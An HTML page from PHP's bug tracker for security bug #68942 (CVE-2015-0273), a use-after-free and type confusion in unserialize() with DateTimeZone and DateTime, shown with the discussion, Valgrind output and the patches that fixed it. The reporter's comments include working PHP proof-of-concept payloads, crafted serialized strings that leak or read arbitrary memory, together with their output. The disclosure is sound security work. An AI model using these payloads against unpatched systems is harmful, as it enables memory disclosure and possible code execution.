<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Date/time related Bug #68942 - RDF' href='rss/bug.php?id=68942'>
        <link rel='alternate' type='application/rss+xml' title='Date/time related Bug #68942 - RSS 2.0' href='rss/bug.php?id=68942&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #68942 :: Use after free vulnerability in unserialize() with DateTimeZone</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=68942">Sec Bug</a>&nbsp;#68942</th>
            <td id="summary" colspan="5">Use after free vulnerability in unserialize() with DateTimeZone</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-01-29 07:20 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2015-02-27 06:04 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=derick">derick</a> (<a href="https://people.php.net/derick">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Date%2Ftime+related">Date/time related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.4.37</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0273" target="_blank">2015-0273</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=68942&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=68942&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=68942&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1422516000">&nbsp;</a><strong>[2015-01-29 07:20 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
I. Use after free vulnerability

static int php_date_timezone_initialize_from_hash(zval **return_value, php_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)
{
	zval            **z_timezone = NULL;
	zval            **z_timezone_type = NULL;

	if (zend_hash_find(myht, &quot;timezone_type&quot;, 14, (void**) &amp;z_timezone_type) == SUCCESS) {
		if (zend_hash_find(myht, &quot;timezone&quot;, 9, (void**) &amp;z_timezone) == SUCCESS) {
			convert_to_long(*z_timezone_type);
			if (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone) TSRMLS_CC)) {
				return SUCCESS;
			}
		}
	}
	return FAILURE;
}

The convert_to_long() leads to the ZVAL and all its children is freed from memory. However the unserialize() code will still allow to use R: or r: to set references to that already freed memory. There is a use after free vulnerability, and allows to execute arbitrary code.

The following code should leak arbitrary memory:

&lt;?php

$fakezval = pack(
    'IIII',
    0x00100000,
    0x00000400,
    0x00000000,
    0x00000006 
);

$data = unserialize('a:2:{i:0;O:12:&quot;DateTimeZone&quot;:2:{s:13:&quot;timezone_type&quot;;a:2:{i:0;i:1;i:1;i:2;}s:8:&quot;timezone&quot;;s:1:&quot;A&quot;;}i:1;R:4;}');

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = $fakezval.$i;
}

var_dump($data);
?&gt;

II. Type confusion vulnerability

Z_STRVAL_PP leads to various problems.

The following code should crash PHP:

&lt;?php

$data = unserialize('O:12:&quot;DateTimeZone&quot;:2:{s:13:&quot;timezone_type&quot;;i:1;s:8:&quot;timezone&quot;;i:1;}');

?&gt;


</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=68942&amp;patch=patch-master&amp;revision=latest" >patch-master</a>
(last revision 2015-02-01 06:58 UTC by stas@php.net)
<br><a href="patch-display.php?bug_id=68942&amp;patch=patch-5.5&amp;revision=latest" >patch-5.5</a>
(last revision 2015-02-01 06:56 UTC by stas@php.net)
<br><a href="patch-display.php?bug_id=68942&amp;patch=patch-5.4&amp;revision=latest" >patch-5.4</a>
(last revision 2015-02-01 06:48 UTC by stas@php.net)
<br><p><a href='patch-add.php?bug_id=68942'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=68942'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1422516613">&nbsp;</a><strong>[2015-01-29 07:30 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Result(test on MAMP with PHP 5.6.5)ï¼š

array(2) { [0]=&gt; object(DateTimeZone)#1 (2) { [&quot;timezone_type&quot;]=&gt; int(2) [&quot;timezone&quot;]=&gt; string(1) &quot;A&quot; } [1]=&gt; string(1024) &quot;3t-ï¿½PQ,0ï¿½ï¿½ï¿½ï¿½ï¿½uï¿½Pï¿½ï¿½ck~ï¿½5ï¿½2Cï¿½ï¿½b&quot;ï¿½Rï¿½ï¿½ï¿½ï¿½ï¿½vï¿½[S+ï¿½ï¿½Pï¿½ï¿½|;ï¿½ï¿½96%ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½lï¿½ï¿½T&lt;[TFï¿½ï¿½aï¿½4ï¿½zï¿½C&quot; }
</pre>
</div><div class='comment type_log' ><a name="1422531376">&nbsp;</a><strong>[2015-01-29 11:36 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: derick</span>
</div></div></div><div class='comment type_log' ><a name="1422531377">&nbsp;</a><strong>[2015-01-29 11:36 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_log' ><a name="1422531676">&nbsp;</a><strong>[2015-01-29 11:41 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1422531676">&nbsp;</a><strong>[2015-01-29 11:41 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>The same problem also exists unserialize() with DateTime, DateInterval and DatePeriod.

static int php_date_initialize_from_hash(php_date_obj **dateobj, HashTable *myht)
{
	zval             *z_date;
	zval             *z_timezone;
	zval             *z_timezone_type;
	zval              tmp_obj;
	timelib_tzinfo   *tzi;
	php_timezone_obj *tzobj;

	z_date = zend_hash_str_find(myht, &quot;date&quot;, sizeof(&quot;data&quot;)-1);
	if (z_date) {
		convert_to_string(z_date);
		z_timezone_type = zend_hash_str_find(myht, &quot;timezone_type&quot;, sizeof(&quot;timezone_type&quot;)-1);
		if (z_timezone_type) {
			convert_to_long(z_timezone_type);
			z_timezone = zend_hash_str_find(myht, &quot;timezone&quot;, sizeof(&quot;timezone&quot;)-1);
			if (z_timezone) {
				convert_to_string(z_timezone);
...

The following code should leak arbitrary memory:

&lt;?php

$fakezval = pack(
    'IIII',
    0x00100000,
    0x00000400,
    0x00000000,
    0x00000006 
);

$data = unserialize('a:2:{i:0;O:8:&quot;DateTime&quot;:3:{s:4:&quot;date&quot;;s:26:&quot;2000-01-01 00:00:00.000000&quot;;s:13:&quot;timezone_type&quot;;a:2:{i:0;i:1;i:1;i:2;}s:8:&quot;timezone&quot;;s:1:&quot;A&quot;;}i:1;R:5;}');

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = $fakezval.$i;
}

var_dump($data);
?&gt;
</pre>
</div><div class='comment type_comment' ><a name="1422535548">&nbsp;</a><strong>[2015-01-29 12:45 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Type Confusion Infoleak Vulnerability PoC:

&lt;?php

$data = unserialize('O:12:&quot;DateTimeZone&quot;:2:{s:13:&quot;timezone_type&quot;;i:1;s:8:&quot;timezone&quot;;i:4298494896}');

?&gt;

Result:
//Work on MacOSX 10.10.2 installation of PHP 5.5.14

$ lldb php
(lldb) target create &quot;php&quot;
Current executable set to 'php' (x86_64).
(lldb) run test/test.php
Process 889 launched: '/usr/bin/php' (x86_64)

Warning: DateTimeZone::__wakeup(): Unknown or bad timezone (UH??AWAVAUATSH??8) in /test/test.php on line 2
Process 889 exited with status = 0 (0x00000000)
</pre>
</div><div class='comment type_log' ><a name="1422772366">&nbsp;</a><strong>[2015-02-01 06:32 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Operating System:</span>
<span class="added">+Operating System: *</span>
<span class="removed">-PHP Version:      5.6.5</span>
<span class="added">+PHP Version:      5.4.37</span>
</div></div></div><div class='comment type_comment' ><a name="1422772367">&nbsp;</a><strong>[2015-02-01 06:32 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Valgrind confirms the issue for 5.4 and up:

  ==73110== Invalid read of size 1
==73110==    at 0x100450699: php_var_dump (in ./cliphp)
==73110==    by 0x100451076: php_array_element_dump (in ./cliphp)
==73110==    by 0x1005C3040: zend_hash_apply_with_arguments (in ./cliphp)
==73110==    by 0x100450D70: php_var_dump (in ./cliphp)
==73110==    by 0x1004512E5: zif_var_dump (in ./cliphp)
==73110==    by 0x1006BE238: zend_do_fcall_common_helper_SPEC (in ./cliphp)
==73110==    by 0x10063D127: ZEND_DO_FCALL_SPEC_CONST_HANDLER (in ./cliphp)
==73110==    by 0x1005EFF39: execute (in ./cliphp)
==73110==    by 0x1005AE29A: zend_execute_scripts (in ./cliphp)
==73110==    by 0x100508F1E: php_execute_script (in ./cliphp)
==73110==    by 0x1007170D2: do_cli (in ./cliphp)
==73110==    by 0x100715E49: main (in ./cliphp)
==73110==  Address 0x101345bf4 is 20 bytes inside a block of size 32 free'd
==73110==    at 0x6AEF: free (in /Users/smalyshev/brew/Cellar/valgrind/3.10.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
==73110==    by 0x10057028F: _efree (in ./cliphp)
==73110==    by 0x100593E70: _zval_ptr_dtor (in ./cliphp)
==73110==    by 0x1005C266D: zend_hash_destroy (in ./cliphp)
==73110==    by 0x1005AA0FF: _zval_dtor_func (in ./cliphp)
==73110==    by 0x10059E3BC: convert_to_long_base (in ./cliphp)
==73110==    by 0x10059E69C: convert_to_long (in ./cliphp)
==73110==    by 0x10000CA5F: php_date_initialize_from_hash (in ./cliphp)
==73110==    by 0x100006AED: zim_DateTime___wakeup (in ./cliphp)
==73110==    by 0x100597BCA: zend_call_function (in ./cliphp)
==73110==    by 0x10059674B: call_user_function_ex (in ./cliphp)
==73110==    by 0x10047738B: object_common2 (in ./cliphp)

etc. Will post the fix proposal soon.
</pre>
</div><div class='comment type_patch' ><a name="1422773336">&nbsp;</a><strong>[2015-02-01 06:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: patch-5.4
Revision:   1422773336
URL:        <a href="https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-5.4&amp;revision=1422773336" rel="nofollow">https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-5.4&amp;revision=1422773336</a>
</pre>
</div><div class='comment type_patch' ><a name="1422773779">&nbsp;</a><strong>[2015-02-01 06:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: patch-5.5
Revision:   1422773779
URL:        <a href="https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-5.5&amp;revision=1422773779" rel="nofollow">https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-5.5&amp;revision=1422773779</a>
</pre>
</div><div class='comment type_patch' ><a name="1422773938">&nbsp;</a><strong>[2015-02-01 06:58 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: patch-master
Revision:   1422773938
URL:        <a href="https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-master&amp;revision=1422773938" rel="nofollow">https://bugs.php.net/patch-display.php?bug=68942&amp;patch=patch-master&amp;revision=1422773938</a>
</pre>
</div><div class='comment type_log' ><a name="1424157095">&nbsp;</a><strong>[2015-02-17 07:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1424157096">&nbsp;</a><strong>[2015-02-17 07:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_log' ><a name="1424237831">&nbsp;</a><strong>[2015-02-18 05:37 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2015-0273</span>
</div></div></div><div class='comment type_comment' ><a name="1424237831">&nbsp;</a><strong>[2015-02-18 05:37 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<pre class='note'>Please use: CVE-2015-0273 php: #68942 Use after free vulnerability in
unserialize() with DateTimeZone
</pre>
</div><div class='comment type_svn' ><a name="1424256017">&nbsp;</a><strong>[2015-02-18 10:40 UTC] <a href="//people.php.net/jpauli">jpauli@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c377f1a715476934133f3254d1e0d4bf3743e2d2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c377f1a715476934133f3254d1e0d4bf3743e2d2</a>
Log: Fix <a href='bug.php?id=68942'>bug #68942</a> (Use after free vulnerability in unserialize() with DateTimeZone)
</pre>
</div><div class='comment type_svn' ><a name="1424256020">&nbsp;</a><strong>[2015-02-18 10:40 UTC] <a href="//people.php.net/jpauli">jpauli@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=51cd5a1d09ce3dd3027eace601661a2bc5745851" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=51cd5a1d09ce3dd3027eace601661a2bc5745851</a>
Log: Fix <a href='bug.php?id=68942'>bug #68942</a> (Use after free vulnerability in unserialize() with DateTimeZone)
</pre>
</div><div class='comment type_svn' ><a name="1424289771">&nbsp;</a><strong>[2015-02-18 20:02 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=71335e6ebabc1b12c057d8017fd811892ecdfd24" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=71335e6ebabc1b12c057d8017fd811892ecdfd24</a>
Log: Fix <a href='bug.php?id=68942'>bug #68942</a> (Use after free vulnerability in unserialize() with DateTimeZone)
</pre>
</div><div class='comment type_comment' ><a name="1424989864">&nbsp;</a><strong>[2015-02-26 22:31 UTC] luigiwalser &#x61;&#116; yahoo &#x64;&#111;&#x74; com</strong>
<pre class='note'>What about part II of the original bug report?  Quoted here:
&quot;II. Type confusion vulnerability
Z_STRVAL_PP leads to various problems.
The following code should crash PHP:
&lt;?php
$data = unserialize('O:12:&quot;DateTimeZone&quot;:2:{s:13:&quot;timezone_type&quot;;i:1;s:8:&quot;timezone&quot;;i:1;}');
?&gt;&quot;

That wasn't fixed.  Is that considered a different issue, was it overlooked, is it not a bug, or something else?
</pre>
</div><div class='comment type_log' ><a name="1424997173">&nbsp;</a><strong>[2015-02-27 00:32 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Closed</span>
<span class="added">+Status: Assigned</span>
</div></div></div><div class='comment type_comment' ><a name="1424997173">&nbsp;</a><strong>[2015-02-27 00:32 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>It is a bug, and i think it is a security issue. 

static int php_date_timezone_initialize_from_hash(zval **return_value, php_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)
{
...
		if (zend_hash_find(myht, &quot;timezone&quot;, 9, (void**) &amp;z_timezone) == SUCCESS) {
			if (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone) TSRMLS_CC)) {
				return SUCCESS;
			}
...
static int timezone_initialize(php_timezone_obj *tzobj, /*const*/ char *tz TSRMLS_DC)
{
	timelib_time *dummy_t = ecalloc(1, sizeof(timelib_time));
	int           dst, not_found;
	char         *orig_tz = tz;

	dummy_t-&gt;z = timelib_parse_zone(&amp;tz, &amp;dst, dummy_t, &amp;not_found, DATE_TIMEZONEDB, php_date_parse_tzfile_wrapper);
	if (not_found) {
		php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;Unknown or bad timezone (%s)&quot;, orig_tz);
		efree(dummy_t);
		return FAILURE;

The Z_STRVAL_PP macro lead to looking up an arbitrary valid memory address, and outputing a string via an warning level error message that start from this memory address.
If the memory address is an invalid memory position, it should result in a crash.

In the BUG report, I wrote a number of use after free bugs, and this type confusion infoleak bug, but the latest patch is not completely solved these bugs, another unfixed bug I had reported in another BUG report, I hope you can read my report carefully, and really fix them.
</pre>
</div><div class='comment type_log' ><a name="1425017053">&nbsp;</a><strong>[2015-02-27 06:04 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1425017053">&nbsp;</a><strong>[2015-02-27 06:04 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>The fix for this type confusion bug has been committed.
</pre>
</div><div class='comment type_comment' ><a name="1447255701">&nbsp;</a><strong>[2015-11-11 15:28 UTC] bshastry &#x61;&#116; sec &#x64;&#111;&#x74; t-labs &#x64;&#111;&#x74; tu-berlin &#x64;&#111;&#x74; de</strong>
<pre class='note'>Just curious: Was a CVE assigned to the type-confusion exploit part of the bug? I see that there is one for the use-after-free part.
</pre>
</div><div class='comment type_svn' ><a name="1469014771">&nbsp;</a><strong>[2016-07-20 11:39 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=625ab10f990911fb474430ac7c83dfaea13346dd" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=625ab10f990911fb474430ac7c83dfaea13346dd</a>
Log: Fix <a href='bug.php?id=68942'>bug #68942</a> (Use after free vulnerability in unserialize() with DateTimeZone)
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
